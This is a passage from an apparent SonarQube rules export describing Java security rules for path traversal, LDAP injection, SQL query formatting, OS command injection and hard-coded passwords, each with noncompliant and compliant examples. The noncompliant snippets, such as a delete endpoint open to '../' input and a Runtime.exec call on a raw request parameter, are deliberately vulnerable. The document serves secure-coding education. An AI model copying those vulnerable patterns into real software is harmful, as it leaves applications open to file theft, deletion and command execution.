occur when an application uses untrusted data to construct a file path and access this file without validating its path first.</p>\n<p>A user with malicious intent would inject specially crafted values, such as <code>../</code>, to change the initial intended path. The resulting\npath would resolve somewhere in the filesystem where the user should not normally have access to.</p>\n<h3>What is the potential impact?</h3>\n<p>A web application is vulnerable to path injection and an attacker is able to exploit it.</p>\n<p>The files that can be affected are limited by the permission of the process that runs the application. Worst case scenario: the process runs with\nroot privileges on Linux, and therefore any file can be affected.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Override or delete arbitrary files</h4>\n<p>The injected path component tampers with the location of a file the application is supposed to delete or write into. The vulnerability is exploited\nto remove or corrupt files that are critical for the application or for the system to work properly.</p>\n<p>It could result in data being lost or the application being unavailable.</p>\n<h4>Read arbitrary files</h4>\n<p>The injected path component tampers with the location of a file the application is supposed to read and output. The vulnerability is exploited to\nleak the content of arbitrary files from the file system, including sensitive files like SSH private keys.</p>\n<h2>How to fix it in Java I/O API</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to path injection as it creates a path using untrusted data without validation.</p>\n<p>In this particular case, the code can be exploited with the following input to delete arbitrary files outside of the intended directory:</p>\n<pre>\n../../../../\n</pre>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n@Controller\npublic class ExampleController\n{\n    static private String targetDirectory = \"/path/to/target/directory/\";\n\n    @GetMapping(value = \"/delete\")\n    public void delete(@RequestParam(\"filename\") String filename) throws IOException {\n\n        File file = new File(targetDirectory + filename);\n        file.delete();\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n@Controller\npublic class ExampleController\n{\n    private static String targetDirectory = \"/path/to/target/directory/\";\n    private static Path targetPath        = new File(targetDirectory).toPath().normalize();\n\n    @GetMapping(value = \"/delete\")\n    public void delete(@RequestParam(\"filename\") String filename) throws IOException {\n\n        File file = new File(targetPath + filename);\n\n        if (!file.toPath().normalize().startsWith(targetPath)) {\n            throw new IOException(\"Entry is outside of the target directory\");\n        }\n\n        file.delete();\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Canonical path validation</h4>\n<p>If it is impossible to use secure-by-design APIs that do this automatically, the universal way to prevent path injection is to validate paths\nconstructed from untrusted data:</p>\n<ol>\n  <li> Ensure the target directory path ends with a forward slash to prevent partial path traversal, for example, <code>/base/dirmalicious</code>\n  starts with <code>/base/dir</code> but does not start with <code>/base/dir/</code>. </li>\n  <li> Resolve the canonical path of the file by using methods like <code>java.io.File.getCanonicalPath</code>. This will resolve relative path or\n  path components like <code>../</code> and removes any ambiguity regarding the fileâs location. </li>\n  <li> Check that the canonical path is within the directory where the file should be located. </li>\n</ol>\n<p><strong>Important Note</strong>: The order of this process pattern is important. The code must follow this order exactly to be secure by\ndesign:</p>\n<ol>\n  <li> <code>data = transform(user_input);</code> </li>\n  <li> <code>data = normalize(data);</code> </li>\n  <li> <code>data = sanitize(data);</code> </li>\n  <li> <code>use(data);</code> </li>\n</ol>\n<p>As pointed out in <a href=\"https://www.youtube.com/watch?v=V-DdcKADnFk\">this SonarSource talk</a>, failure to follow this exact order leads to\nsecurity vulnerabilities.</p>\n<h3>Pitfalls</h3>\n<h4>Partial Path Traversal</h4>\n<p>When validating untrusted paths by checking if they start with a trusted folder name, <strong>ensure the validation string contains a path\nseparator as the last character</strong>.<br> A partial path traversal vulnerability can be unintentionally introduced into the application without a\npath separator as the last character of the validation strings.</p>\n<p>For example, the following code is vulnerable to partial path injection. Note that the string <code>targetDirectory</code> does not end with a path\nseparator:</p>\n<pre>\nstatic private String targetDirectory = \"/Users/John\";\n\n@GetMapping(value = \"/endpoint\")\npublic void endpoint(@RequestParam(\"folder\") File fileName) throws IOException {\n\n    String canonicalizedFileName = fileName.getCanonicalPath();\n\n    if (!canonicalizedFileName .startsWith(targetDirectory)) {\n        throw new IOException(\"Entry is outside of the target directory\");\n    }\n}\n</pre>\n<p>This check can be bypassed because <code>\"/Users/Johnny\".startsWith(\"/Users/John\")</code> returns <code>true</code>. Thus, for validation,\n<code>\"/Users/John\"</code> should actually be <code>\"/Users/John/\"</code>.</p>\n<p><strong>Warning</strong>: Some functions, such as <code>.getCanonicalPath</code>, remove the terminating path separator in their return value.<br>\nThe validation code should be tested to ensure that it cannot be impacted by this issue.</p>\n<p><a href=\"https://github.com/aws/aws-sdk-java/security/advisories/GHSA-c28r-hw5m-5gv3\">Here is a real-life example of this vulnerability.</a></p>\n<h4>Do not use java.nio.file.Path.resolve as a validator</h4>\n<p>As specified in the <a href=\"https://docs.oracle.com/javase/8/docs/api/java/nio/file/Path.html\">official documentation</a>, if the given parameter\nis an absolute path, the base object from which the method is called is discarded and is not included in the resulting string.</p>\n<p>This means that including untrusted data in the parameter and using the resulting string for file operations may lead to a path traversal\nvulnerability.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2023-risks/m4-insufficient-input-output-validation\">Mobile Top 10 2024 Category M4\n  - Insufficient Input/Output Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/22\">CWE-22 - Improper Limitation of a Pathname to a Restricted Directory ('Path\n  Traversal')</a> </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222609\">Application Security and\n  Development: V-222609</a> - The application must not be subject to input handling vulnerabilities. </li>\n</ul>\n\n","impacts":[{"name":"security","level":"BLOCKER"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2083","summary":"I/O function calls should not be vulnerable to path injection attacks","tags":["cwe","injection"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":null},"cleanCodeAttribute":"COMPLETE","type":"Vulnerability"},{"availability":["sonarcloud","sonarqube"],"defaultSeverity":"Blocker","description":"<h2>Why is this an issue?</h2>\n<p>LDAP injections occur in an application when the application retrieves untrusted data and inserts it into an LDAP query without sanitizing it\nfirst.</p>\n<p>An LDAP injection can either be basic or blind, depending on whether the serverâs fetched data is directly returned in the web applicationâs\nresponse.<br> The absence of the corresponding response for the malicious request on the application is not a barrier to exploitation. Thus, it must\nbe treated the same way as basic LDAP injections.</p>\n<h3>What is the potential impact?</h3>\n<p>In the context of a web application vulnerable to LDAP injection: after discovering the injection point, attackers insert data into the vulnerable\nfield to execute malicious LDAP commands.</p>\n<p>The impact of this vulnerability depends on how vital LDAP servers are to the organization.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Data leakage or corruption</h4>\n<p>In typical scenarios where systems perform innocuous LDAP operations to find users or create inventories, an LDAP injection could result in data\nleakage or corruption.</p>\n<h4>Privilege escalation</h4>\n<p>A malicious LDAP query could allow an attacker to impersonate a low-privileged user or an administrator in scenarios where systems perform\nauthorization checks or authentication.</p>\n<p>Attackers use this vulnerability to find multiple footholds on target organizations by gathering authentication bypasses.</p>\n<h2>How to fix it in Java JNDI API</h2>\n<h3>Code examples</h3>\n<p>The following noncompliant code is vulnerable to LDAP injections because untrusted data is concatenated to an LDAP query without prior sanitization\nor validation.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport javax.naming.directory.DirContext;\nimport javax.naming.directory.SearchControls;\n\npublic boolean authenticate(HttpServletRequest req, DirContext ctx) throws NamingException {\n  String user = req.getParameter(\"user\");\n  String pass = req.getParameter(\"pass\");\n\n  String filter = \"(&amp;(uid=\" + user + \")(userPassword=\" + pass + \"))\";\n\n  NamingEnumeration&lt;SearchResult&gt; results = ctx.search(\"ou=system\", filter, new SearchControls());\n  return results.hasMore();\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport javax.naming.directory.DirContext;\nimport javax.naming.directory.SearchControls;\n\npublic boolean authenticate(HttpServletRequest req, DirContext ctx) throws NamingException {\n  String user = req.getParameter(\"user\");\n  String pass = req.getParameter(\"pass\");\n\n  String filter = \"(&amp;(uid={0})(userPassword={1}))\";\n\n  NamingEnumeration&lt;SearchResult&gt; results = ctx.search(\"ou=system\", filter, new String[]{user, pass}, new SearchControls());\n  return results.hasMore();\n}\n</pre>\n<h3>How does this work?</h3>\n<p>As a rule of thumb, the best approach to protect against injections is to systematically ensure that untrusted data cannot break out of the\ninitially intended logic.</p>\n<p>For LDAP injection, the cleanest way to do so is to use parameterized queries if it is available for your use case.</p>\n<p>Another approach is to sanitize the input before using it in an LDAP query. Input sanitization should be primarily done using native libraries.</p>\n<p>Alternatively, validation can be implemented using an allowlist approach by creating a list of authorized and secure strings you want the\napplication to use in a query. If a user input does not match an entry in this list, it should be rejected because it is considered unsafe.</p>\n<p><strong>Important note</strong>: The application must sanitize and validate on the server-side. Not on client-side front-ends.</p>\n<p>The most fundamental security mechanism is the restriction of LDAP metacharacters.</p>\n<p>For <strong>Distinguished Names</strong> (DN), special characters that need to be escaped include:</p>\n<ul>\n  <li> <code>\\</code> </li>\n  <li> <code>#</code> </li>\n  <li> <code>+</code> </li>\n  <li> <code>&lt;</code> </li>\n  <li> <code>&gt;</code> </li>\n  <li> <code>,</code> </li>\n  <li> <code>;</code> </li>\n  <li> <code>\"</code> </li>\n  <li> <code>=</code> </li>\n</ul>\n<p>For <strong>Search Filters</strong>, special characters that need to be escaped include:</p>\n<ul>\n  <li> <code>*</code> </li>\n  <li> <code>(</code> </li>\n  <li> <code>)</code> </li>\n  <li> <code>\\</code> </li>\n  <li> <code>null</code> </li>\n</ul>\n<p>For Java, OWASPâs functions <a\nhref=\"https://www.javadoc.io/doc/org.owasp.esapi/esapi/latest/org/owasp/esapi/Encoder.html#encodeForDN-java.lang.String-\"><code>encodeForDN</code></a>\nand <a\nhref=\"https://www.javadoc.io/doc/org.owasp.esapi/esapi/latest/org/owasp/esapi/Encoder.html#encodeForLDAP-java.lang.String-\"><code>encodeForLDAP</code></a>\nallow sanitizing these characters and should be used: Remember that it is never a good practice to reinvent the wheel and write your own encoders.<br>\nHowever, if it is not possible to use these libraries, <a\nhref=\"https://github.com/bcgit/bc-java/blob/r1rv74/prov/src/main/java/org/bouncycastle/jce/provider/X509LDAPCertStoreSpi.java#L52-L70\">here</a> is an\nexample of an encoder implementation for LDAP search filters, in the <code>Bouncy Castle Java</code> framework.</p>\n<p>In the compliant solution example, the <code>search</code> function allows to safely parameterize the query.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> IETF - <a href=\"https://www.ietf.org/rfc/rfc4514.txt\">RFC 4514 - LDAP: String Representation of Distinguished Names</a> </li>\n  <li> IETF - <a href=\"https://www.ietf.org/rfc/rfc4515.txt\">RFC 4515 - LDAP: String Representation of Search Filters</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/90\">CWE-90 - Improper Neutralization of Special Elements used in an LDAP Query ('LDAP\n  Injection')</a> </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222609\">Application Security and\n  Development: V-222609</a> - The application must not be subject to input handling vulnerabilities. </li>\n</ul>\n\n","impacts":[{"name":"security","level":"BLOCKER"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2078","summary":"LDAP queries should not be vulnerable to injection attacks","tags":["cwe","cert","injection"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":null},"cleanCodeAttribute":"COMPLETE","type":"Vulnerability"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<p>Formatted SQL queries can be difficult to maintain, debug and can increase the risk of SQL injection when concatenating untrusted values into the\nquery. However, this rule doesnât detect SQL injections (unlike rule {rule:javasecurity:S3649}), the goal is only to highlight complex/formatted queries.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Some parts of the query come from untrusted values (like user inputs). </li>\n  <li> The query is repeated/duplicated in other parts of the code. </li>\n  <li> The application must support different types of relational databases. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Use <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html\">parameterized queries, prepared\n  statements, or stored procedures</a> and bind variables to SQL query parameters. </li>\n  <li> Consider using ORM frameworks if there is a need to have an abstract layer to access data. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\npublic User getUser(Connection con, String user) throws SQLException {\n\n  Statement stmt1 = null;\n  Statement stmt2 = null;\n  PreparedStatement pstmt;\n  try {\n    stmt1 = con.createStatement();\n    ResultSet rs1 = stmt1.executeQuery(\"GETDATE()\"); // No issue; hardcoded query\n\n    stmt2 = con.createStatement();\n    ResultSet rs2 = stmt2.executeQuery(\"select FNAME, LNAME, SSN \" +\n                 \"from USERS where UNAME=\" + user);  // Sensitive\n\n    pstmt = con.prepareStatement(\"select FNAME, LNAME, SSN \" +\n                 \"from USERS where UNAME=\" + user);  // Sensitive\n    ResultSet rs3 = pstmt.executeQuery();\n\n    //...\n}\n\npublic User getUserHibernate(org.hibernate.Session session, String data) {\n\n  org.hibernate.Query query = session.createQuery(\n            \"FROM students where fname = \" + data);  // Sensitive\n  // ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic User getUser(Connection con, String user) throws SQLException {\n\n  Statement stmt1 = null;\n  PreparedStatement pstmt = null;\n  String query = \"select FNAME, LNAME, SSN \" +\n                 \"from USERS where UNAME=?\"\n  try {\n    stmt1 = con.createStatement();\n    ResultSet rs1 = stmt1.executeQuery(\"GETDATE()\");\n\n    pstmt = con.prepareStatement(query);\n    pstmt.setString(1, user);  // Good; PreparedStatements escape their inputs.\n    ResultSet rs2 = pstmt.executeQuery();\n\n    //...\n  }\n}\n\npublic User getUserHibernate(org.hibernate.Session session, String data) {\n\n  org.hibernate.Query query =  session.createQuery(\"FROM students where fname = ?\");\n  query = query.setParameter(0,data);  // Good; Parameter binding escapes all input\n\n  org.hibernate.Query query2 =  session.createQuery(\"FROM students where fname = \" + data); // Sensitive\n  // ...\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/89\">CWE-89 - Improper Neutralization of Special Elements used in an SQL Command</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/564\">CWE-564 - SQL Injection: Hibernate</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/943\">CWE-943 - Improper Neutralization of Special Elements in Data Query Logic</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/ITdGBQ\">CERT, IDS00-J.</a> - Prevent SQL injection </li>\n  <li> Derived from FindSecBugs rules <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JPA\">Potential SQL/JPQL Injection\n  (JPA)</a>, <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JDO\">Potential SQL/JDOQL Injection (JDO)</a>, <a\n  href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_HIBERNATE\">Potential SQL/HQL Injection (Hibernate)</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"},{"name":"security","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2077","summary":"Formatting SQL queries is security-sensitive","tags":["cwe","spring","bad-practice","cert","hibernate","sql"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Security Hotspot"},{"availability":["sonarcloud","sonarqube"],"defaultSeverity":"Blocker","description":"<h2>Why is this an issue?</h2>\n<p>OS command injections occur when applications build command lines from untrusted data before executing them with a system shell.<br> In that case,\nan attacker can tamper with the command line construction and force the execution of unexpected commands. This can lead to the compromise of the\nunderlying operating system.</p>\n<h3>What is the potential impact?</h3>\n<p>An attacker exploiting an OS command injection vulnerability will be able to execute arbitrary commands on the underlying operating system.</p>\n<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process runs with root privileges,\nand therefore any OS commands or programs may be affected.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Denial of service and data leaks</h4>\n<p>In this scenario, the attack aims to disrupt the organizationâs activities and profit from data leaks.</p>\n<p>An attacker could, for example:</p>\n<ul>\n  <li> download the internal serverâs data, most likely to sell it </li>\n  <li> modify data, send malware </li>\n  <li> stop services or exhaust resources (with fork bombs for example) </li>\n</ul>\n<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>\n<h4>Root privilege escalation and pivot</h4>\n<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate\ntheir privileges to an administrative level and attacks other servers.</p>\n<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised\nby a combination of OS injections and <strong>misconfiguration</strong> of:</p>\n<ul>\n  <li> Docker or Kubernetes clusters </li>\n  <li> cloud services </li>\n  <li> network firewalls and routing </li>\n  <li> OS access control </li>\n</ul>\n<h2>How to fix it in Apache Commons</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to command injections because it is using untrusted inputs to set up a new process. Therefore an attacker can\nexecute an arbitrary program that is installed on the system.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n@Controller\npublic class ExampleController\n{\n    @GetMapping(value = \"/exec\")\n    public void exec(@RequestParam(\"command\") String command) throws IOException {\n\n        CommandLine cmd = new CommandLine(command);\n        DefaultExecutor executor = new DefaultExecutor();\n        executor.execute(cmd);\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n@Controller\npublic class ExampleController\n{\n    @GetMapping(value = \"/exec\")\n    public void exec(@RequestParam(\"command\") String command) throws IOException {\n\n        List&lt;String&gt; allowedCmds = new ArrayList&lt;String&gt;();\n        allowedCmds.add(\"/bin/ls\");\n        allowedCmds.add(\"/bin/cat\");\n\n        if (allowedCmds.contains(command)){\n            CommandLine cmd = new CommandLine(command);\n            DefaultExecutor executor = new DefaultExecutor();\n            executor.execute(cmd);\n        }\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>Allowing users to execute operating system commands generally creates more problems than it solves.</p>\n<p>Anything that can be done via operating system commands can usually be done via a languageâs native SDK.<br> Therefore, our first suggestion is to\navoid using OS commands in the first place.<br> However, if the application requires running OS commands with user-controlled data, here are some\nsecurity suggestions.</p>\n<h4>Pre-Approved commands</h4>\n<p>If the application aims to execute only a small number of OS commands (for example, <code>ls</code>, <code>pwd</code>, and <code>grep</code>), the\ncleanest way to avoid this problem is to validate the input before using it in an OS command.</p>\n<p>Create a list of authorized and secure commands that you want the application to be able to execute. Use absolute paths to avoid any ambiguity.<br>\nIf a user input does not match an entry in this list, it should be rejected because it is considered unsafe.</p>\n<p>Depending on the number of commands you want the application to support, the list can be either a regex string or any array type. If you use\nregexes, choose simple regexes to avoid ReDOS attacks. For example, you can accept only a specific set of executables, by using\n<code>^/bin/(ls|pwd|grep)$</code>.</p>\n<p><strong>Important note</strong>: The application must do validation on the server side. Not on client-side front-ends.</p>\n<h4>Neutralize special characters</h4>\n<p>If the application is to execute complex commands that cannot be controlled thanks to pre-approved lists, the cleanest approach is to use special\nsanitization components, such as <code>org.apache.commons.exec.CommandLine.addArguments(String[] addArguments)</code>.</p>\n<p>The library helps you to get rid of common dangerous characters, such as:</p>\n<ul>\n  <li> <code>&amp;</code> </li>\n  <li> <code>|</code> </li>\n  <li> <code>;</code> </li>\n  <li> <code>$</code> </li>\n  <li> <code>&gt;</code> </li>\n  <li> <code>&lt;</code> </li>\n  <li> <code>`</code> </li>\n  <li> <code>\\</code> </li>\n  <li> <code>!</code> </li>\n</ul>\n<p>If user input is to be included in the arguments of a command, the application must ensure that dangerous options or argument delimiters are\nneutralized.<br> Argument delimiters count <code>'</code>, <code>-</code> and spaces.</p>\n<p>For example, the <code>find</code> command from UNIX supports the dangerous argument <code>-exec</code>.<br> In this case, option processing can be\nterminated with a string containing <code>--</code> or with special options. For example, <code>git</code> supports <code>--end-of-options</code> <a\nhref=\"https://github.blog/2019-11-03-highlights-from-git-2-24/#tidbits\">since its version 2.24</a>.</p>\n<p>Here <code>org.apache.commons.exec.CommandLine.addArguments(String[] addArguments)</code> takes care of escaping the passed arguments and\ninternally creates a single string given to the operating system to be executed.</p>\n<h2>How to fix it in Java Lang Package</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to command injections because it is using untrusted inputs to set up a new process. Therefore an attacker can\nexecute an arbitrary program that is installed on the system.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"noncompliant\">\n@Controller\npublic class ExampleController\n{\n    @GetMapping(value = \"/exec\")\n    public void exec(@RequestParam(\"command\") String command) throws IOException {\n        Runtime.getRuntime().exec(command);\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"compliant\">\n@Controller\npublic class ExampleController\n{\n    @GetMapping(value = \"/exec\")\n    public void exec(@RequestParam(\"command\") String command) throws IOException {\n        List&lt;String&gt; allowedCmds = new ArrayList&lt;String&gt;();\n        allowedCmds.add(\"/usr/bin/ls\");\n        allowedCmds.add(\"/usr/bin/cat\");\n        if (allowedCmds.contains(command)){\n          Process proc = Runtime.getRuntime().exec(command);\n        }\n    }\n}\n</pre>\n<p>java.lang.Runtime is sometimes used over java.lang.ProcessBuilder due to ease of use. Flexibility in methods often introduces security issues as\nedge cases are easily missed. The compliant solution logic is also applied to java.lang.ProcessBuilder.</p>\n<h3>How does this work?</h3>\n<p>Allowing users to execute operating system commands generally creates more problems than it solves.</p>\n<p>Anything that can be done via operating system commands can usually be done via a languageâs native SDK.<br> Therefore, our first suggestion is to\navoid using OS commands in the first place.<br> However, if the application requires running OS commands with user-controlled data, here are some\nsecurity suggestions.</p>\n<h4>Pre-Approved commands</h4>\n<p>If the application aims to execute only a small number of OS commands (for example, <code>ls</code>, <code>pwd</code>, and <code>grep</code>), the\ncleanest way to avoid this problem is to validate the input before using it in an OS command.</p>\n<p>Create a list of authorized and secure commands that you want the application to be able to execute. Use absolute paths to avoid any ambiguity.<br>\nIf a user input does not match an entry in this list, it should be rejected because it is considered unsafe.</p>\n<p>Depending on the number of commands you want the application to support, the list can be either a regex string or any array type. If you use\nregexes, choose simple regexes to avoid ReDOS attacks. For example, you can accept only a specific set of executables, by using\n<code>^/bin/(ls|pwd|grep)$</code>.</p>\n<p><strong>Important note</strong>: The application must do validation on the server side. Not on client-side front-ends.</p>\n<h4>Neutralize special characters</h4>\n<p>If the application is to execute complex commands that cannot be controlled thanks to pre-approved lists, the cleanest approach is to use special\nsanitization components, such as <code>java.lang.Runtime.exec(String[] cmdarray)</code>.</p>\n<p>The library helps you to get rid of common dangerous characters, such as:</p>\n<ul>\n  <li> <code>&amp;</code> </li>\n  <li> <code>|</code> </li>\n  <li> <code>;</code> </li>\n  <li> <code>$</code> </li>\n  <li> <code>&gt;</code> </li>\n  <li> <code>&lt;</code> </li>\n  <li> <code>`</code> </li>\n  <li> <code>\\</code> </li>\n  <li> <code>!</code> </li>\n</ul>\n<p>If user input is to be included in the arguments of a command, the application must ensure that dangerous options or argument delimiters are\nneutralized.<br> Argument delimiters count <code>'</code>, <code>-</code> and spaces.</p>\n<p>For example, the <code>find</code> command from UNIX supports the dangerous argument <code>-exec</code>.<br> In this case, option processing can be\nterminated with a string containing <code>--</code> or with special options. For example, <code>git</code> supports <code>--end-of-options</code> <a\nhref=\"https://github.blog/2019-11-03-highlights-from-git-2-24/#tidbits\">since its version 2.24</a>.</p>\n<p>Here <code>java.lang.Runtime.exec(String[] cmdarray)</code> takes care of escaping the passed arguments and internally creates a single string\ngiven to the operating system to be executed.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> OWASP - <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html\">OS Command Injection Defense\n  Cheat Sheet</a> </li>\n  <li> GTFOBins - <a href=\"https://gtfobins.github.io/#+shell\">list of Unix binaries that can be used to bypass local security restrictions</a> </li>\n  <li> LOLBAS - <a href=\"https://lolbas-project.github.io/#\">list of Windows binaries that can be used to bypass local security restrictions</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2023-risks/m4-insufficient-input-output-validation\">Mobile Top 10 2024 Category M4\n  - Insufficient Input/Output Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/78\">CWE-78 - Improper Neutralization of Special Elements used in an OS Command</a> </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222604\">Application Security and\n  Development: V-222604</a> - The application must protect from command injection. </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222609\">Application Security and\n  Development: V-222609</a> - The application must not be subject to input handling vulnerabilities. </li>\n</ul>\n\n","impacts":[{"name":"security","level":"BLOCKER"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2076","summary":"OS commands should not be vulnerable to command injection attacks","tags":["cwe","injection"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":null},"cleanCodeAttribute":"COMPLETE","type":"Vulnerability"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Blocker","description":"<p>Because it is easy to extract strings from an application source code or binary, passwords should not be hard-coded. This is particularly true for\napplications that are distributed or that are open-source.</p>\n<p>In the past, it has led to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"https://www.cve.org/CVERecord?id=CVE-2019-13466\">CVE-2019-13466</a> </li>\n  <li> <a href=\"https://www.cve.org/CVERecord?id=CVE-2018-15389\">CVE-2018-15389</a> </li>\n</ul>\n<p>Passwords should be stored outside of the code in a configuration file, a database, or a password management service.</p>\n<p>This rule flags instances of hard-coded passwords used in database and LDAP connections. It looks for hard-coded passwords in connection strings,\nand for variable names that match any of the patterns from the provided list.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The password allows access to a sensitive component like a database, a file storage, an API, or a service. </li>\n  <li> The password is used in production environments. </li>\n  <li> Application re-distribution is required before updating the password. </li>\n</ul>\n<p>There would be a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Store the credentials in a configuration file that is not pushed to the code repository. </li>\n  <li> Store the credentials in a database. </li>\n  <li> Use your cloud providerâs service for managing secrets. </li>\n  <li> If a password has been disclosed through the source code: change it. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nString username = \"steve\";\nString password = \"blue\";\nConnection conn = DriverManager.getConnection(\"jdbc:mysql://localhost/test?\" +\n                  \"user=\" + username + \"&amp;password=\" + password); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nString username = getEncryptedUser();\nString password = getEncryptedPassword();\nConnection conn = DriverManager.getConnection(\"jdbc:mysql://localhost/test?\" +\n                  \"user=\" + username + \"&amp;password=\" + password);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication\">Top 10 2017 Category A2 - Broken Authentication</a>\n  